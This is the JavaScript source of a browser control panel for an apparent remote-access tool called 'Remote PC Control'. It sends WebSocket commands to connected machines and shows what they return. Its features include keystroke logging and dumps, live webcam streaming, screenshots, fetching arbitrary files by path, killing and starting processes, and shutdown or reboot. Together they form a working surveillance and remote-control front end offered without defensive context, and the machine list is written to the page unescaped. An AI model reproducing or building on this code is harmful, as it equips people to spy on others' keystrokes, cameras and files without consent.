/**
 * Remote PC Control – Browser Client
 */

const WS_URL = `ws://${location.host}`;

let ws            = null;
let selectedMachine = null;

// ── WebSocket lifecycle ───────────────────────────────────────────────────────
function connect() {
  ws = new WebSocket(WS_URL);

  ws.onopen = () => {
    setWsState("connected");
    // register as browser
    ws.send(JSON.stringify({ role: "browser", type: "register" }));
  };

  ws.onclose = () => {
    setWsState("disconnected – retrying…");
    setTimeout(connect, 3000);
  };

  ws.onerror = () => setWsState("error");

  ws.onmessage = (evt) => {
    let msg;
    try { msg = JSON.parse(evt.data); } catch { return; }
    handleMessage(msg);
  };
}

function setWsState(text) {
  document.getElementById("ws-state").textContent = text;
}

// ── Message router ────────────────────────────────────────────────────────────
function handleMessage(msg) {
  switch (msg.type) {
    case "machines":  renderMachineList(msg.list); break;
    case "response":  handleResponse(msg);         break;
    case "error":     toast("Error: " + msg.message, true); break;
  }
}

function handleResponse(msg) {
  if (msg.id !== selectedMachine) return;   // ignore responses for other machines

  if (msg.error) {
    toast("Error [" + msg.action + "]: " + msg.error, true);
    return;
  }

  switch (msg.action) {
    case "list_processes": renderProcesses(msg.data);  break;
    case "list_apps":      renderApps(msg.data);       break;
    case "kill_process":
    case "kill_app":
    case "start_process":
    case "start_app":      toast(msg.data);            break;
    case "screenshot":     showScreenshot(msg.data);   break;
    case "keylog_start":
    case "keylog_stop":    toast(msg.data);            break;
    case "keylog_dump":    appendKeylog(msg.data);     break;
    case "download_file":  triggerDownload(msg.data);  break;
    case "webcam_frame":   showWebcamFrame(msg.data);  break;
    case "webcam_start":
    case "webcam_stop":    toast(msg.data);            break;
    case "shutdown":
    case "reboot":
      document.getElementById("system-status").textContent = msg.data;
      document.getElementById("system-status").style.display = "block";
      toast(msg.data);
      break;
  }
}

// ── Machine sidebar ───────────────────────────────────────────────────────────
function renderMachineList(list) {
  const container = document.getElementById("machine-list");
  const noMsg     = document.getElementById("no-machines");

  if (list.length === 0) {
    container.innerHTML = "";
    container.appendChild(noMsg);
    if (list.indexOf(selectedMachine) === -1) {
      selectedMachine = null;
      showWelcome();
    }
    return;
  }

  noMsg.style.display = "none";
  container.innerHTML = "";
  list.forEach((id) => {
    const el = document.createElement("div");
    el.className = "machine-item" + (id === selectedMachine ? " active" : "");
    el.innerHTML = `<div class="machine-dot"></div><span>${id}</span>`;
    el.onclick = () => selectMachine(id);
    container.appendChild(el);
  });
}

function selectMachine(id) {
  selectedMachine = id;
  document.getElementById("selected-machine").textContent = id;

  // Update sidebar highlight
  document.querySelectorAll(".machine-item").forEach((el) => {
    el.classList.toggle("active", el.querySelector("span").textContent === id);
  });

  showMachinePanel();
  // Auto-load process list on selection
  cmd("list_processes");
}

// ── Panel visibility ──────────────────────────────────────────────────────────
function showWelcome() {
  document.getElementById("welcome").style.display = "flex";
  document.getElementById("machine-panel").style.display = "none";
}

function showMachinePanel() {
  document.getElementById("welcome").style.display = "none";
  document.getElementById("machine-panel").style.display = "flex";
}

// ── Tab switching ─────────────────────────────────────────────────────────────
document.querySelectorAll(".tab-btn").forEach((btn) => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".tab-btn").forEach((b) => b.classList.remove("active"));
    document.querySelectorAll(".tab-panel").forEach((p) => p.classList.remove("active"));
    btn.classList.add("active");
    document.getElementById("tab-" + btn.dataset.tab).classList.add("active");
  });
});

// ── Command sender ────────────────────────────────────────────────────────────
function cmd(action, extra = {}) {
  if (!selectedMachine || !ws || ws.readyState !== WebSocket.OPEN) return;
  ws.send(JSON.stringify({ target: selectedMachine, action, ...extra }));
}

// ── PROCESSES ─────────────────────────────────────────────────────────────────
function renderProcesses(list) {
  const tbody = document.getElementById("process-table");
  tbody.innerHTML = list.map((p) => `
    <tr>
      <td><span class="pid-badge">${p.pid}</span></td>
      <td>${esc(p.name)}</td>
      <td>${esc(p.status)}</td>
      <td>${p.cpu}%</td>
      <td>${p.mem}%</td>
      <td><button class="action-btn danger" onclick="killProcess(${p.pid})">Kill</button></td>
    </tr>`).join("");
}

function killProcess(pid) {
  cmd("kill_process", { pid });
}

function startProcess() {
  const name = document.getElementById("start-process-name").value.trim();
  if (!name) return;
  cmd("start_process", { name });
}

// ── APPLICATIONS ──────────────────────────────────────────────────────────────
function renderApps(list) {
  const tbody = document.getElementById("app-table");
  tbody.innerHTML = list.map((a) => `
    <tr>
      <td><span class="pid-badge">${a.pid}</span></td>
      <td>${esc(a.title)}</td>
      <td><button class="action-btn danger" onclick="killApp(${a.pid})">Kill</button></td>
    </tr>`).join("");
}

function killApp(pid) {
  cmd("kill_app", { pid });
}

function startApp() {
  const name = document.getElementById("start-app-name").value.trim();
  if (!name) return;
  cmd("start_app", { name });
}

// ── SCREENSHOT ────────────────────────────────────────────────────────────────
function showScreenshot(b64) {
  const img = document.getElementById("screenshot-img");
  img.src = "data:image/jpeg;base64," + b64;
  img.style.display = "block";
  document.getElementById("save-screenshot-btn").style.display = "inline-block";
}

function saveScreenshot() {
  const img = document.getElementById("screenshot-img");
  if (!img.src.startsWith("data:")) return;
  const a = document.createElement("a");
  a.href = img.src;
  a.download = `screenshot-${selectedMachine}-${Date.now()}.jpg`;
  a.click();
}

// ── KEYLOGGER ─────────────────────────────────────────────────────────────────
function appendKeylog(data) {
  const el = document.getElementById("keylog-output");
  if (!data) { toast("No new keystrokes"); return; }
  el.textContent += data;
  el.scrollTop = el.scrollHeight;
}

function clearKeylog() {
  document.getElementById("keylog-output").textContent = "";
}

// ── FILE DOWNLOAD ─────────────────────────────────────────────────────────────
function downloadFile() {
  const path = document.getElementById("file-path").value.trim();
  if (!path) return;
  cmd("download_file", { path });
}

function triggerDownload(info) {
  const box = document.getElementById("file-status");
  box.style.display = "block";
  box.textContent = `Received: ${info.name}  (${info.size} bytes)`;

  const bytes = Uint8Array.from(atob(info.data), (c) => c.charCodeAt(0));
  const blob  = new Blob([bytes]);
  const url   = URL.createObjectURL(blob);
  const a     = document.createElement("a");
  a.href = url;
  a.download = info.name;
  a.click();
  URL.revokeObjectURL(url);
  toast(`Downloaded: ${info.name}`);
}

// ── WEBCAM ────────────────────────────────────────────────────────────────────
function startWebcam() {
  cmd("webcam_start");
  document.getElementById("webcam-start-btn").style.display = "none";
  document.getElementById("webcam-stop-btn").style.display  = "inline-block";
  document.getElementById("webcam-img").style.display       = "block";
}

function stopWebcam() {
  cmd("webcam_stop");
  document.getElementById("webcam-start-btn").style.display = "inline-block";
  document.getElementById("webcam-stop-btn").style.display  = "none";
}

function showWebcamFrame(b64) {
  if (!b64) return;
  document.getElementById("webcam-img").src = "data:image/jpeg;base64," + b64;
}

// ── SYSTEM ────────────────────────────────────────────────────────────────────
function confirmAction(action, message) {
  if (confirm(message)) cmd(action);
}

// ── Utilities ─────────────────────────────────────────────────────────────────
function esc(str) {
  return String(str ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

let toastTimer = null;
function toast(msg, isError = false) {
  const el = document.getElementById("toast");
  el.textContent = msg;
  el.style.borderColor = isError ? "#e74c3c" : "#7eb8f7";
  el.style.color        = isError ? "#e74c3c" : "#e0e0e0";
  el.classList.add("show");
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => el.classList.remove("show"), 3500);
}

// ── Boot ──────────────────────────────────────────────────────────────────────
connect();
